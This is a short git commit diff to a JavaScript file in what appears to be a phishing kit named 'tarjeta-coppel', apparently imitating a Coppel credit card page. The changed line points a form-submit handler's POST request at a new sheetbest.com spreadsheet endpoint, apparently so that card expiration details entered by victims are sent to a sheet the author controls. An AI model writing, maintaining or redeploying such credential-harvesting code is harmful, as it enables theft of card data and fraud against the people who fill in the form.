a91dd41b011329a6937f373ad0ad048ce061247d
25a-mx <robledofrancis4@gmail.com>
2026-08-25 09:24:14 -0600

    Update API endpoint in fechavencimiento.js

--- tarjeta-coppel/js/fechavencimiento.js
+++ tarjeta-coppel/js/fechavencimiento.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/239848f2-2851-4251-a7d1-7d1531a77192', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/187d1f7d-8403-49c7-864e-a756b7580eff', {
         method: 'POST',
         mode: 'cors',
         headers: {
